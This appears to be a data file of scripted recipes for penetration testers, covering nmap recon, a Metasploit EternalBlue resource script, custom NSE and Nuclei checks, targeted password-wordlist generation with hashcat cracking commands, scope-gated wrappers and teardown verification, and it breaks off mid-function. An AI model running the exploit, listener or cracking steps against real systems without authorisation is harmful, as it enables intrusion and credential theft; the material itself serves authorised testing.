/* ==========================================================================
   ZothPen — the Forge: customising your tooling with scripts.
   window.ZF = [ recipe, ... ]

   recipe schema:
     { id, title, lang:'bash'|'python'|'ruby'|'yaml'|'lua'|'powershell'|'text',
       lvl:'base'|'mid'|'deep', time:'~20 min',
       why:'why this exists / what it saves you',
       when:['situation','situation'],
       code:'the thing you actually paste',
       parts:[{ k:'line or symbol', v:'what it means and why it matters' }],
       harden:['what to change before you use it for real'],
       next:['what to build on top of it'] }

   Every recipe is written to be read, edited and re-run — not imported as a
   black box. That is the entire point: your toolchain should be yours.
   ========================================================================== */
window.ZF = [

{ id:'f-alias', title:'The five aliases that pay for themselves', lang:'bash', lvl:'base', time:'~10 min',
  why:'Automation pays back in proportion to how often you type the thing. These five cover the commands you will run on literally every host, and they remove the typos that cost you the most time.',
  when:['first day of any engagement','setting up a fresh VM','whenever you catch yourself retyping something'],
  code:`# ~/.zshrc  (or ~/.bashrc — same content, no changes needed)

# 1. full-port sweep that writes all three nmap formats, named by target
alias fullscan='nmap -sS -p- --min-rate 2000 -n'

# 2. open ports -> comma list, ready to paste into -p
alias ports='grep -oE "[0-9]+/open/tcp" | cut -d/ -f1 | sort -un | paste -sd,'

# 3. a listener you can actually use (readline: arrows, history, Ctrl-C)
alias listen='rlwrap -cAr nc -lvnp'

# 4. instant file staging for the target
alias serve='python3 -m http.server'

# 5. new engagement folder with the whole structure up front
newop() {
  local t="\${1:?usage: newop TARGET}"
  mkdir -p "\$t"/{scan,loot,shots,logs} && cd "\$t" && \\
    printf 'engagement: %s\\nstart: %s\\nscope: <fill me in>\\nRoE contact: <fill me in>\\n' \\
      "\$t" "\$(date -Is)" > logs/00-activity.log && cat logs/00-activity.log
}`,
  parts:[
    { k:'alias fullscan', v:'The full-port sweep is the first command of every engagement. Naming it means you never again run a top-1000 scan by accident and miss the unmanaged service on 1433.' },
    { k:'ports', v:'Reads on stdin, so it composes: nmap ... | ports. Turns scan output into the exact string the next command wants.' },
    { k:'rlwrap', v:'A raw nc listener has no line editing — no history, no arrows, and Ctrl-C kills your listener instead of the remote process. rlwrap fixes all three at once.' },
    { k:'newop()', v:'A function, not an alias, because it takes an argument. It creates the layout and the activity log on day one — the log you will paste into the report.' },
    { k:'\\${1:?...}', v:'Parameter expansion that aborts with a usage message when the argument is missing. This is how you stop a script from silently doing the wrong thing.' }
  ],
  harden:['Set the engagement variables (scope, contact) in the log at creation, not at the end — you will forget','Keep client-specific aliases in a per-engagement file you source, not in your global shell config'],
  next:['Turn newop into an engagement report skeleton generator','Add a shell function that runs the whole recon chain: fullscan -> ports -> -sV'] },

{ id:'f-recon-chain', title:'A recon chain that fails loudly', lang:'bash', lvl:'mid', time:'~30 min',
  why:'The first hour of an engagement is a fixed sequence. Scripting it means the sequence happens the same way every time, results land in predictable paths, and a failure stops the run instead of producing a half-empty report.',
  when:['every internal engagement','any external range with many hosts','when you want a re-runnable baseline'],
  code:`#!/usr/bin/env bash
# recon.sh TARGET_CIDR OUTDIR           — one job: sweep, triage, version-scan
set -euo pipefail
shopt -s nullglob

TARGET="\${1:?usage: recon.sh TARGET_CIDR OUTDIR}"
OUT="\${2:?usage: recon.sh TARGET_CIDR OUTDIR}"
mkdir -p "\$OUT"
: > "\$OUT/activity.log"

log() { printf '%s  %s\\n' "\$(date -Is)" "\$*" | tee -a "\$OUT/activity.log"; }

log "start sweep \$TARGET -> \$OUT"
nmap -sS -p- --min-rate 2000 -n -oA "\$OUT/allports" "\$TARGET" >/dev/null

# greppable output is the contract with the next step
awk '/Ports:/ {print \$2}' "\$OUT/allports.gnmap" | sort -u > "\$OUT/live.txt"
log "live hosts: \$(wc -l < "\$OUT/live.txt")"

# per-host version scan, four at a time, output named by host
while read -r host; do
  ( nmap -sV -sC -Pn -oA "\$OUT/\$host" "\$host" >/dev/null 2>&1 ) &
  while (( \$(jobs -r | wc -l) >= 4 )); do sleep 0.3; done
done < "\$OUT/live.txt"
wait

log "done — \$OUT/*.gnmap"
grep -h 'Ports:' "\$OUT"/*.gnmap | head -40`,
  parts:[
    { k:'set -euo pipefail', v:'Without this, a failed nmap is ignored and the script reports success. -e stops on error, -u stops on undefined variables (the typo catcher), -o pipefail makes a failure in the middle of a pipe fatal.' },
    { k:'\\${1:?usage...}', v:'Aborts with usage rather than scanning an empty target. The single most valuable line in any script that takes a network as an argument.' },
    { k:': > "\$OUT/activity.log"', v:'Truncates the log so a re-run starts clean. Your activity log is the evidence that your testing was authorised.' },
    { k:'log()', v:'Timestamps every step to the terminal and the file at once. This is what you hand the SOC when they ask what happened at 14:32.' },
    { k:'awk ... live.txt', v:'Greppable nmap output is the stable interface between steps. Parsing the human-readable release is how scripts break on nmap upgrades.' },
    { k:'( ... ) &  +  jobs -r', v:'Bounded parallelism: four hosts at a time. Unbounded & on a /16 will exhaust your FD limit and hammer the network.' },
    { k:'wait', v:'Blocks until the per-host scans finish, so the summary is complete and not a race.' }
  ],
  harden:['Add a scope check: resolve every host and abort if any falls outside the authorised CIDR','Move wordlists, threads and rate to a config file so the script is reusable across clients','Add `--reason` and save timing files when the client asks how you knew a port was filtered'],
  next:['Chain it: detect HTTP on the results and hand them to httpx, then to nuclei with a low rate limit','Add per-phase resume: skip hosts whose .gnmap already exists'] },

{ id:'f-parse', title:'Parsing tool output into a report table', lang:'python', lvl:'mid', time:'~25 min',
  why:'By the end of an engagement you have twenty output files and you need one table. Doing it by hand means transcription errors in the document the client pays for.',
  when:['building the findings table','checking coverage before you claim full scope','any engagement with more than five hosts'],
  code:`#!/usr/bin/env python3
"""findings.py out/  — turn nmap + nxc output into a markdown findings table."""
import re, sys, pathlib, csv

PORT = re.compile(r"^(\\d+)/open/(\\w+)\\s+(\\S+)\\s*(.*)$")

def from_nmap(path):
    host = path.stem
    port, svc, ver = [], "", ""
    for line in path.read_text(errors="replace").splitlines():
        m = PORT.match(line.strip())
        if m:
            port.append(f"{m.group(1)}/{m.group(2)}")
            svc = m.group(3)
            ver = m.group(4)[:60]
    return {"host": host, "ports": ",".join(port), "service": svc, "version": ver}

def from_nxc(path):
    """nxc writes one line per host: 'SMB 10.0.0.5 445 DC01 [*] Windows ... (name:DC01)'"""
    rows = []
    for line in path.read_text(errors="replace").splitlines():
        parts = line.split()
        if len(parts) > 4 and parts[1].count(".") == 3:
            rows.append({"host": parts[1], "proto": parts[0],
                         "detail": " ".join(parts[4:])[:80]})
    return rows

def main(outdir):
    out = pathlib.Path(outdir)
    rows = [from_nmap(p) for p in sorted(out.glob("*.nmap"))]
    if not rows:
        sys.exit(f"no .nmap files in {outdir} — did the scan run?")
    w = csv.DictWriter(sys.stdout, fieldnames=rows[0].keys(), dialect="unix")
    print("| host | ports | service | version |")
    print("|------|-------|---------|---------|")
    for r in rows:
        print(f"| {r['host']} | {r['ports']} | {r['service']} | {r['version']} |")
    print(f"\\n{len(rows)} hosts", file=sys.stderr)

if __name__ == "__main__":
    main(sys.argv[1] if len(sys.argv) > 1 else "scan")`,
  parts:[
    { k:'re.compile(...)', v:'Compile the pattern once. A regex on nmap output is a stable contract; string splitting on whitespace is not.' },
    { k:'pathlib.Path.glob("*.nmap")', v:'Reads exactly the files you produced. No hardcoded names, no assumptions about how many hosts there were.' },
    { k:'errors="replace"', v:'nmap output contains arbitrary service banners and occasionally invalid UTF-8. Without this your parser dies on one weird banner at 23:00.' },
    { k:'sys.exit(msg)', v:'Exits non-zero with an explanation. A parser that prints an empty table is worse than one that fails.' },
    { k:'print(..., file=sys.stderr)', v:'Summary to stderr so you can pipe the markdown table straight into your report without the count getting mixed in.' },
    { k:'[:60] / [:80]', v:'Truncate version strings and details. Report tables should be readable; the raw file is still on disk.' }
  ],
  harden:['Redact internal hostnames and credentials columns before the report leaves your machine','Add a CSV output for the client\'s ticketing system','Read the client\'s asset list and mark any tested host that is not on it — that is your scope evidence'],
  next:['Emit a per-finding section with the exact command and a copy of the response','Diff two runs to prove remediation between test and retest'] },

{ id:'f-rc', title:'A re-runnable Metasploit resource script', lang:'text', lvl:'mid', time:'~15 min',
  why:'Typing the same module options by hand produces a different test every time — and nothing to put in the report. A resource script makes the run identical, reviewable, and repeatable after remediation.',
  when:['any exploit you will run more than once','whenever the client needs a re-test','when writing up a finding with an exact reproduction'],
  code:`# vuln-ms17-010.rc — usage: msfconsole -q -r vuln-ms17-010.rc
spool /tmp/ms17-010-\${TARGET}.log
setg RHOSTS 192.168.56.20
setg LHOST 192.168.56.5
setg LPORT 4444
setg VERBOSE false

use exploit/windows/smb/ms17_010_eternalblue
check
echo [*] target: \${RHOSTS}  result: see check output above
run -j
sleep 20
sessions -l
makerc /tmp/ms17-010-replay.rc   # the exact run, to re-execute after patching

# on exit:
spool off`,
  parts:[
    { k:'spool', v:'Records the whole session — input and output — to a file. This is the raw evidence behind the finding, and it is timestamped.' },
    { k:'setg RHOSTS/LHOST', v:'Global options set once. The run is now parameterised: change one line and the same script hits a different host.' },
    { k:'check', v:'Always before run. It tests without exploiting, so a host that is not vulnerable does not get crashed by a blind attempt.' },
    { k:'run -j', v:'Runs as a background job, so the console stays usable while the session establishes — and a hung exploit does not lock you out of your own console.' },
    { k:'sessions -l', v:'Explicit listing instead of assuming the session opened. Evidence, not hope.' },
    { k:'makerc', v:'Writes every command you ran to a replayable file. That file is what you hand over so the finding can be verified after remediation.' }
  ],
  harden:['Never leave setg LHOST as an external address — a session that phones home to the wrong host is an incident','Put the spool path inside the engagement directory, not /tmp','Add `set ExitOnSession false` when you expect more than one session'],
  next:['Wrap it in a shell script that takes the target as an argument and picks the right module','Generate the finding text from the spool file automatically'] },

{ id:'f-nse', title:'Write your own NSE script for a proprietary service', lang:'lua', lvl:'deep', time:'~45 min',
  why:'Plenty of internal services have no matching nmap script, so you end up hand-crafting the same probe on every engagement. One script puts it inside your normal scan pipeline, on every host, in parallel.',
  when:['a custom banner or proprietary protocol keeps showing up','you want a check to run across a whole estate','you are tired of copy-pasting nc one-liners'],
  code:`-- custom-banner.nse — identify a proprietary service on a non-standard port
-- usage: nmap -p 9100 --script custom-banner 192.168.56.0/24
local nmap = require "nmap"
local shortport = require "shortport"
local stdnse = require "stdnse"

description = [[
Sends the vendor discovery probe and reports the version tuple.
Written for services that answer a fixed request with a version string.
]]
author = "you"
license = "Same as Nmap -- see https://nmap.org/book/man-legal.html"
categories = {"discovery", "safe"}

portrule = shortport.port_or_service(9100, "unknown")

action = function(host, port)
  local sock = nmap.new_socket()
  sock:set_timeout(3000)
  local ok, err = sock:connect(host, port)
  if not ok then return nil end

  -- the probe: vendor magic + newline
  sock:send("ZT\\x01QUERY\\n")
  local status, data = sock:receive_buf("\\r?\\n", true)
  sock:close()

  if not status or not data or #data == 0 then return nil end
  local ver = data:match("ver=(%d+%.%d+%.%d+)")
  if ver then
    return ("vendor service version %s (raw: %s)"):format(ver, data:sub(1, 64))
  end
  return ("vendor service, unrecognised banner: %s"):format(data:sub(1, 64))
end`,
  parts:[
    { k:'categories = {"discovery","safe"}', v:'Script categories decide when this runs. "safe" means it does not modify state, so it is acceptable in a normal scan; never mark a state-changing probe safe.' },
    { k:'portrule', v:'Which ports the script applies to. port_or_service ties it to a port number and, where known, a service name.' },
    { k:'set_timeout(3000)', v:'Every network probe needs a timeout. Without one a single unresponsive host stalls the whole scan.' },
    { k:'receive_buf("\\r?\\n", true)', v:'Read until a newline (handling CRLF) rather than a fixed byte count — services truncate or pad inconsistently.' },
    { k:'match("ver=(%d+%.%d+%.%d+)")', v:'Extract a structured version. Structured output is what lets you correlate results across 500 hosts later.' },
    { k:'sub(1, 64)', v:'Truncate raw banners. Unbounded output from a hostile service will wreck your terminal and your output files.' }
  ],
  harden:['Only send a probe that a normal client would send, and only against in-scope hosts','Deploy to ~/.nmap/scripts/ and pass --script-updatedb','Keep the timeout conservative: scripts run per port per host'],
  next:['Add a vulnerability check as a separate script so discovery stays safe and the intrusive check is opt-in','Turn the discovered versions into a searchsploit query automatically'] },

{ id:'f-nuclei', title:'Author a Nuclei template for a pattern you keep finding', lang:'yaml', lvl:'deep', time:'~30 min',
  why:'The first time you find an exposed admin panel is a finding. The fifth time is a template. Writing your own means the check runs against every host in every future engagement, at your rate limit, with your evidence.',
  when:['you have found the same misconfiguration twice','you need a re-testable check after remediation','you want proof-of-remediation, not a memory of it'],
  code:`# ~/nuclei-templates/custom/exposed-admin-panel.yaml
id: exposed-admin-panel

info:
  name: Exposed unauthenticated admin panel
  author: you
  severity: high
  description: |
    An administrative interface answers without authentication and leaks the
    application version, which maps to known CVEs. Found on internal estates
    where the panel was never meant to leave the management VLAN.
  tags: exposure,panel,misconfig
  reference:
    - https://example.com/internal-standard

requests:
  - method: GET
    path:
      - "{{BaseURL}}/admin/"
      - "{{BaseURL}}/manage/status"
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "Admin Console"
        condition: or
      - type: status
        status:
          - 200
      - type: regex
        part: body
        name: version
        regex:
          - "build ([0-9]{4}\\\\.[0-9]{2}\\\\.[0-9]{2})"
        internal: false

# verify the finding (and the fix) the same way every time:
#   nuclei -u https://host -t ~/nuclei-templates/custom/exposed-admin-panel.yaml -rl 10`,
  parts:[
    { k:'id', v:'The stable name of the check. It is what appears in the report and in the re-test, so it must not change when you edit the template.' },
    { k:'severity', v:'Drives default filtering. Changing this changes whether the template fires on an ordinary run — use -severity to sort findings, never to make them look better.' },
    { k:'matchers-condition: and', v:'Requires all conditions: the page text and the version pattern. A single matcher on "Admin Console" alone produces false positives from documentation pages.' },
    { k:'internal: false', v:'names the extracted value so it is printed in the result. That is the evidence line you paste into the report.' },
    { k:'tags', v:'-tags panel only runs the templates you want. This is the difference between a targeted re-test and a full scan of the client again.' },
    { k:'Regex escaping \\\\.', v:'YAML and regex escaping stack. Double-escape in YAML, or the raw string reaches the regex engine with the backslash eaten.' }
  ],
  harden:['Never write a template that modifies state — templates are for detection','Test it against a host you own first; a bad matcher wastes the client\'s scan window','Keep custom templates in a git repo: they are a professional asset that grows with you'],
  next:['Write the counterpart template that proves the fix (404 where the panel used to be)','Group your templates by client and run them as a retest suite'] },

{ id:'f-wrapper', title:'A wrapper that turns any tool into a safe, logged, repeatable step', lang:'bash', lvl:'mid', time:'~20 min',
  why:'Individual commands do not compose. A wrapper gives every tool the same shape: validates its target against scope, logs the exact command, timestamps it, and refuses to run unless you pass an opt-in flag. This is the difference between "I think I ran that" and "here is the log".',
  when:['runwrapping every tool you use on an engagement','when a client asks exactly what was executed','when you keep forgetting to save output'],
  code:`#!/usr/bin/env bash
# runwrapped.sh — usage: runwrapped.sh TARGET LABEL -- COMMAND...
set -euo pipefail

SCOPE_FILE="\${SCOPE_FILE:-scope.txt}"
LOGDIR="\${LOGDIR:-logs}"
DRY=\${DRY:-1}          # safe by default: DRY=1 prints, DRY=0 executes

target="\${1:?usage: runwrapped.sh TARGET LABEL -- COMMAND...}"
label="\${2:?usage: runwrapped.sh TARGET LABEL -- COMMAND...}"
shift 2
[[ "\${1:-}" == "--" ]] && shift

mkdir -p "\$LOGDIR"

# scope gate: every target must appear in scope.txt (one CIDR/name per line)
if [[ ! -f "\$SCOPE_FILE" ]]; then
  echo "refusing: \$SCOPE_FILE missing — write your authorised scope first" >&2; exit 3
fi
if ! grep -qF -- "\$target" "\$SCOPE_FILE"; then
  echo "REFUSING: \$target is not listed in \$SCOPE_FILE" >&2
  echo "add it only after the client confirms it in writing." >&2; exit 4
fi

stamp="\$(date +%Y%m%dT%H%M%S)"
out="\$LOGDIR/\${stamp}-\${label//[^A-Za-z0-9_.-]/_}"
printf '%s\\t%s\\t%s\\t%s\\n' "\$stamp" "\$target" "\$label" "\$*" >> "\$LOGDIR/activity.log"

echo "[\$stamp] \$label -> \$target"
printf '    %s\\n' "\$*"
if (( DRY )); then
  echo "    (DRY=1: not executed — re-run with DRY=0 when you are sure)"
  exit 0
fi

"\$@" > "\$out.out" 2> "\$out.err"
echo "    wrote \$out.out / \$out.err"`,
  parts:[
    { k:'DRY=${DRY:-1}', v:'Safe by default. Automation multiplies mistakes, so the default behaviour is to print the plan. A deliberate DRY=0 is the opt-in.' },
    { k:'SCOPE_FILE gate', v:'Scope enforcement in code, not in your head. A typo in a CIDR cannot scan the wrong network if the target has to be in a file the client approved.' },
    { k:'grep -qF --', v:'-F for literal matching (no regex surprises), -- so a target beginning with a dash is not parsed as a flag.' },
    { k:'\${label//[^A-Za-z0-9_.-]/_}', v:'Sanitises the label into a safe filename. User-supplied names in paths are a directory traversal habit you do not want in your own tooling.' },
    { k:'activity.log', v:'One append-only, timestamped record of target, label and exact command line. This file is your answer to "what did you touch, and when".' },
    { k:'"\$@" > out 2> err', v:'Separates stdout from stderr so results and errors are readable independently, and quotes "$@" so arguments with spaces survive.' }
  ],
  harden:['Put the scope file under version control and never edit it mid-engagement without a written change','Make DRY=0 require a typed confirmation for destructive labels','Rotate the activity log per day, not per engagement'],
  next:['Add a `--teardown` mode that records every listener/tunnel you started and kills them from that list','Make the wrapper refuse any command containing a shell metacharacter you did not expect'] },

{ id:'f-checker', title:'A self-check that runs before every engagement', lang:'bash', lvl:'mid', time:'~25 min',
  why:'You forget the same things every time: update tools, snapshot the VM, check the RoE has a stop contact, confirm the source IP. A pre-flight script turns discipline into a checklist the machine enforces.',
  when:['start of every engagement','after a long break between projects','when onboarding someone onto your methodology'],
  code:`#!/usr/bin/env bash
# preflight.sh — run it, read it, fix the FAILs
set -uo pipefail
fail=0; warn=0
say() { printf '%-6s %s\\n' "\$1" "\$2"; }
ok()   { say OK   "\$1"; }
no()   { say FAIL "\$1"; ((fail++)); }
wr()   { say WARN "\$1"; ((warn++)); }

# 1. tooling freshness — a stale template is a false negative
if [[ -d ~/nuclei-templates ]]; then
  age=\$(( ( \$(date +%s) - \$(stat -c %Y ~/nuclei-templates ) ) / 86400 ))
  (( age > 14 )) && wr "nuclei templates are \${age}d old — run: nuclei -update-templates" || ok "nuclei templates fresh (\${age}d)"
else
  wr "nuclei templates not found — install them before web work"
fi

# 2. the RoE must name a stop contact and a scope
roe="\${ROE:?set ROE=/path/to/roe.txt first}"
grep -qiE 'stop|contact|emergency' "\$roe" && ok "RoE has a stop/contact clause" || no "RoE has no stop contact — do not start"
grep -qiE '(in.?scope|authoris|authoriz)' "\$roe" && ok "RoE states authorisation/scope" || no "RoE does not state scope"

# 3. source IP will be seen by the client's SOC — know it
ip=\$(ip -4 route get 1.1.1.1 2>/dev/null | awk '{print \$7; exit}')
[[ -n "\$ip" ]] && ok "your SOC-visible source IP: \$ip  (tell the client)" || wr "could not determine source IP"

# 4. snapshot discipline
if systemd-detect-virt --quiet 2>/dev/null; then
  wr "you are in a VM — take a snapshot now, before anything destructive"
fi

# 5. client data separation
if mount | grep -qE "on /home .*ext4"; then
  wr "client loot will land in /home — confirm full-disk encryption is on"
fi

echo
echo "preflight: \$fail failures, \$warn warnings"
(( fail == 0 )) || { echo "fix the FAILs before you touch the client."; exit 1; }`,
  parts:[
    { k:'say()/ok()/no()/wr()', v:'Consistent output shape. A checklist that prints differently every time is one you stop reading.' },
    { k:'stat -c %Y', v:'Checks the age of the template directory rather than trusting your memory. Stale templates produce false negatives, which read as "nothing found".' },
    { k:'\${ROE:?}', v:'Refuses to run at all without an RoE path. The strongest control here: you cannot skip the check by forgetting to pass a flag.' },
    { k:'grep -qiE "stop|contact"', v:'Assertions, not reminders. The script fails if the document does not contain the clause — the same check you would otherwise do in a hurry.' },
    { k:'ip -4 route get 1.1.1.1', v:'Tells you the address the client will see. That address belongs in the RoE and in the first email to their SOC.' },
    { k:'exit 1 on failure', v:'Non-zero exit so it can be wired into a shell profile or CI. A check that always exits 0 changes nothing.' }
  ],
  harden:['Never put client names or credentials in the script itself — it reads paths and asserts on content','Extend the FAIL list rather than the WARN list: warnings are ignored, failures are not'],
  next:['Add a teardown verifier that checks no listener, tunnel or route remains','Generate the activity log header from the same RoE the checker validates'] },

{ id:'f-wordlist', title:'Generate wordlists that fit the target', lang:'bash', lvl:'mid', time:'~20 min',
  why:'Generic lists miss the passwords people actually use — company name, product names, seasons plus a year, and the pattern where a site name is followed by digits. Twenty minutes of targeted generation beats a week of generic cracking.',
  when:['generic lists produced nothing','you have gathered company information and want to use it','building a rule set for hashcat'],
  code:`#!/usr/bin/env bash
# mkwords.sh SEEDS_TXT [YEAR]    — build a client-specific candidate list
set -euo pipefail
seed="\${1:?usage: mkwords.sh SEEDS_TXT [YEAR]}"
year="\${2:-\$(date +%Y)}"

[[ -s "\$seed" ]] || { echo "seed file is empty: \$seed" >&2; exit 1; }

# 1-2. base forms: raw, capitalised, leetspeak-ish, year-suffixed
awk 'NF' "\$seed" | while read -r s; do
  l="\${s,,}"; u="\${s^^}"; c="\${l^}"
  printf '%s\\n%s\\n%s\\n' "\$l" "\$c" "\$u"
  printf '%s\\n' "\${l//a/@}" "\${l//o/0}" "\${l//e/3}" "\${l//i/1}"
  for y in "\$year" "\$((year-1))" "\$((year-2))" 123 '!' '@2026'; do
    printf '%s%s\\n%s%s\\n%s_%s\\n' "\$c" "\$y" "\$l" "\$y" "\$c" "\$y"
  done
done | sort -u > "\$\$.list"

# 3. add the seasons/months people actually use
for p in Spring Summer Autumn Winter January December; do
  for y in "\$year" "\$((year-1))"; do printf '%s\\n%s%s\\n%s%s!\\n' "\$p" "\$p" "\$y" "\$p" "\$y"; done
done >> "\$\$.list"

sort -u "\$\$.list" -o candidates.txt && rm -f "\$\$.list"
wc -l candidates.txt

# 4. use it directly, then as a hashcat rule base
echo "hashcat -m 1000 ntlm.txt candidates.txt -r /usr/share/hashcat/rules/best64.rule"
echo "hashcat -m 1000 ntlm.txt candidates.txt -a 6 candidates.txt '?d?d?d'   # word+3 digits"

# 5. never forget the sprayed password: it is already a valid credential
echo "# sprayed passwords found during the engagement belong in this list first"`,
  parts:[
    { k:'\${s,,} / \${s^^} / \${l^}', v:'Lowercase, uppercase and capitalised forms — because password policy forces a capital and users put it in the same place every time.' },
    { k:'\${l//a/@} etc.', v:'Substitutions that still satisfy complexity requirements (a→@, o→0, e→3, i→1). This is why "complexity requirements" produce predictable passwords.' },
    { k:'sort -u', v:'Deduplicating is not cosmetic: every duplicate is wasted GPU time, and these lists grow fast.' },
    { k:'\$\$.list then -o candidates.txt', v:'Build in a temp file, write the final atomically. A half-written wordlist that looks complete is how you conclude "the password is strong" wrongly.' },
    { k:'-a 6 ... ?d?d?d', v:'A combinator-plus-mask attack appends digits to every candidate. Rules cover more ground; this covers the specific "word plus three digits" pattern cheaply.' },
    { k:'the sprayed-password note', v:'The most-missed candidates are the ones you already found valid elsewhere. They belong at the top of the list, before any cracking.' }
  ],
  harden:['Keep the seed file tied to the engagement, and delete it at teardown along with the loot','Do not include personal data of employees you were not authorised to process','Record which list produced which cracks — the report should say how the credential was obtained'],
  next:['Write a hashcat .rule file that encodes the substitutions you use most','Feed the same seeds into password-policy analysis for the client (patterns are the finding)'] },

{ id:'f-report', title:'Report generation from your own notes', lang:'bash', lvl:'mid', time:'~30 min',
  why:'The last day of an engagement should be spent on judgement, not on copying screenshots into a template. Generate the skeleton and the boilerplate from your logs, and use your remaining time to explain impact.',
  when:['writing up any engagement','preparing a retest report','when the client asks for the same structure as last time'],
  code:`#!/usr/bin/env bash
# mkreport.sh ENGAGEMENT_DIR   — skeleton + gathered evidence into pandoc markdown
set -euo pipefail
d="\${1:?usage: mkreport.sh ENGAGEMENT_DIR}"
cd "\$d"

title="\${CLIENT:-CLIENT} — penetration test report"
{
  printf '# %s\\n\\n' "\$title"
  printf '| field | value |\\n|---|---|\\n'
  printf '| test window | %s |\\n' "\$(head -1 logs/00-activity.log | cut -f2-)"
  printf '| scope | %s |\\n' "\$(grep -i scope logs/00-activity.log | cut -d: -f2- | xargs || echo '<from RoE>')"
  printf '| testers | %s |\\n' "\$(whoami)"
  printf '| version | 1.0 (draft) |\\n\\n'

  echo '## Executive summary'
  echo '<!-- 3 paragraphs max. What could an attacker reach, how fast, and what is the'
  echo '     single most important thing to fix. No tool names. No CVSS. -->'
  echo
  echo '## Scope and methodology'
  echo "\`\`\`"
  echo "# generated from the activity log — do not edit by hand"
  grep -E '^[0-9]{4}-' logs/activity.log 2>/dev/null | head -30 \\
    || echo "no activity.log — reconstruct from your notes"
  echo "\`\`\`"
  echo
  echo '## Findings'
  for f in findings/*.md; do [[ -e "\$f" ]] && cat "\$f"; done
  echo
  echo '## Coverage checklist'
  sed 's/^/- [x] /' scope.txt 2>/dev/null || echo '- [ ] scope.txt missing'
  echo
  echo '## Appendix A — raw output index'
  find scan loot -type f 2>/dev/null | sort | sed 's/^/- /'
} > report.md

echo "wrote \$d/report.md"
command -v pandoc >/dev/null && echo "render: pandoc report.md -o report.docx --reference-doc=template.docx"`,
  parts:[
    { k:'the header table', v:'Client, window, scope and version on page one. The first question any reader asks is "what was tested and when" — answer it before they ask.' },
    { k:'the HTML comments in the summary', v:'Placeholders that explain what belongs there. They force you to write impact in plain language instead of pasting tool output.' },
    { k:'grep ../activity.log', v:'The methodology section comes from your own timestamped log. This is both less work and stronger evidence than a written narrative you reconstruct from memory.' },
    { k:'cat findings/*.md', v:'One file per finding, merged in order. Writing findings as separate files means you can name, sort and hand them to the client independently.' },
    { k:'find scan loot -type f', v:'An index of raw evidence, so any finding can be traced back to the file it came from. Reviewers and retesters need this.' },
    { k:'pandoc --reference-doc', v:'Renders to the client\'s own branded .docx template. Content stays in markdown you can diff; presentation stays with them.' }
  ],
  harden:['Redact credentials, internal hostnames and personal data in the batch that leaves your machine — the raw evidence stays in the engagement directory','Say what you did not test, and why. Negative scope is a finding about coverage'],
  next:['Generate the retest plan from your findings list, one verification step per finding','Keep the skeleton in git so the structure improves with every engagement'] },

{ id:'f-teardown', title:'Teardown that is verifiable, not assumed', lang:'bash', lvl:'mid', time:'~20 min',
  why:'Leftover listeners, routes and agents are live access into the client network. "I killed the shell" is not teardown. This script records what you start and proves what is gone.',
  when:['end of every engagement, every day on a long one','after any pivoting or C2 work','before you write the report'],
  code:`#!/usr/bin/env bash
# teardown.sh — record what you started, then verify nothing remains
set -uo pipefail
REC="\${REC:-logs/artefacts.txt}"       # written as you go: kind, TAB, value
miss=0

register() { printf '%s\\t%s\\n' "\$1" "\$2" >> "\$REC"; }   # call from your wrappers

echo "== registered artefacts =="
cat "\$REC" 2>/dev/null || echo "(nothing registered — that is itself a red flag)"

echo
echo "== live checks =="

# listeners you started
while IFS=\$'\\t' read -r kind val; do
  case "\$kind" in
    port)
      if ss -lntp 2>/dev/null | grep -q ":\$val "; then
        echo "STILL UP : listener on \$val"; miss=1
      else echo "closed   : listener \$val"; fi ;;
    route)
      if ip route show | grep -q "\$val"; then
        echo "STILL UP : route \$val  -> ip route del \$val"; miss=1
      else echo "removed  : route \$val"; fi ;;
    tun)
      if ip link show "\$val" &>/dev/null; then
        echo "STILL UP : interface \$val -> ip link del \$val"; miss=1
      else echo "removed  : interface \$val"; fi ;;
    file)
      echo "VERIFY   : \${val} (confirm it is deleted on the target, and say so in the report)" ;;
  esac
done < "\$REC" 2>/dev/null

# anything started after the engagement began and still running
echo
echo "== processes started during the test =="
find /proc -maxdepth 1 -name '[0-9]*' -newermt "\$(head -1 logs/activity.log | awk '{print \$1}' 2>/dev/null || echo '7 days ago')" \\
  -exec sh -c 'p=\$(cat {}/comm 2>/dev/null); grep -qE "chisel|ligolo|nc|ncat|socat|socks" <<<"\$p" && echo "  pid \$(basename {}) \$p"' \\; 2>/dev/null || true

echo
if (( miss )); then
  echo "TEARDOWN INCOMPLETE — do not close the engagement yet."; exit 1
fi
echo "teardown clean. Paste this output into the report as evidence."`,
  parts:[
    { k:'register()', v:'Teardown starts at the beginning, not the end. Your wrappers call register the moment they start a listener, route or tunnel — so the list is generated, not remembered.' },
    { k:'ss -lntp', v:'Checks actual listening sockets on your machine, not your intent. This is the difference between "I closed it" and "it is closed".' },
    { k:'ip route show / ip link show', v:'Routes and TUN interfaces outlive shells. A leftover route is a permanent path into the client network.' },
    { k:'the file case', v:'Some things you cannot verify from your side — a dropped agent on a Windows host needs checking on the host. Say so explicitly; it is a to-do, not an assumption.' },
    { k:'-newermt ... /proc scan', v:'Catches things you forgot to register: any tunnel or listener process started during the engagement window.' },
    { k:'exit 1', v:'Non-zero on incomplete teardown, so the report step can be gated on it.' }
  ],
  harden:['Register artefacts inside the same wrapper that starts them — never rely on remembering','Keep the artefacts file with the engagement evidence; it is your proof of clean removal at retest time'],
  next:['Make the wrapper refuse to start a tunnel without registering it','Add the Windows side: a checklist that runs over your WinRM/agent sessions and confirms removal'] },

{ id:'f-python', title:'Write your own enumeration tool in Python', lang:'python', lvl:'deep', time:'~40 min',
  why:'At some point a manual probe becomes a script. Writing it yourself means you understand every request it sends — which matters when a client asks exactly what your tool did.',
  when:['you have manual-tested the same service type three times','an existing tool does not cover your case','you need output in a format your report wants'],
  code:`#!/usr/bin/env python3
"""sweep.py — probe a list of hosts for one service and print findings as JSON.
Usage: python3 sweep.py hosts.txt --port 9100 --delay 0.5 --out results.json"""
import argparse, ipaddress, json, socket, sys, time
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, asdict

PROBE = b"ZT\\x01QUERY\\n"

@dataclass
class Result:
    host: str; port: int; state: str; banner: str = ""; version: str = ""; error: str = ""

def in_scope(host: str, nets: list[str]) -> bool:
    """Fail closed: anything not provably inside scope is refused."""
    if not nets:
        return False
    for n in nets:
        try:
            if ipaddress.ip_address(host) in ipaddress.ip_network(n, strict=False):
                return True
        except ValueError:          # hostname, not an IP: resolve then re-check
            try:
                ip = socket.gethostbyname(host)
                if ipaddress.ip_address(ip) in ipaddress.ip_network(n, strict=False):
                    return True
            except Exception:
                continue
    return False

